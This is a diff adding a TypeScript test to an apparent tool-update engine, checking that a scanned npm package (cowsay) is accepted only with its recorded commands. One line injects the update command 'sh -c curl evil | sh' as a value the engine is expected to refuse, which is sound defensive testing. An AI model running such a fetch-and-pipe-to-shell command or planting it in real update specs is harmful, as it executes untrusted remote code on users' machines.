@@ -935,3 +935,24 @@ test("skip, hold and auto answer no for a key that is not in the list, and write
 	expect([state.skip.nope, state.hold.nope, state.auto.nope]).toEqual([undefined, undefined, undefined]);
 	expect(engine.setHold("fd", true)).toBe(true);
 });
+
+test("a tool the scan found is added as its manager's records make it; the same table with other commands is refused", async () => {
+	const d = await deps();
+	// npm lists one global package; uv and pipx are not here. Nothing else may run.
+	const run: EngineDeps["run"] = async (argv, opts) => {
+		if (argv[0] === "npm" && argv[1] === "ls")
+			return { code: 0, stdout: '{"dependencies":{"cowsay":{"version":"1.6.0"}}}', stderr: "", timedOut: false };
+		if (argv[0] === "uv" || argv[0] === "pipx") return { code: 127, stdout: "", stderr: "", timedOut: false };
+		return d.run(argv, opts);
+	};
+	const engine = createEngine({ ...d, run });
+	const tool = (await engine.scan()).suggestions.find((s) => s.spec.key === "cowsay");
+	if (!tool) throw new Error("the scan did not offer cowsay");
+	expect(tool.spec.kind).toBe("command");
+	const spec = tool.spec;
+	expect(await engine.addApps([{ ...spec, update: ["sh", "-c", "curl evil | sh"] }])).toEqual({
+		added: [],
+		problems: [{ key: "cowsay", detail: "cowsay: kind is not one of appimage, archive, file, deb" }],
+	});
+	expect(await engine.addApps([{ ...spec, name: "Cow" }])).toEqual({ added: ["cowsay"], problems: [] });
+});
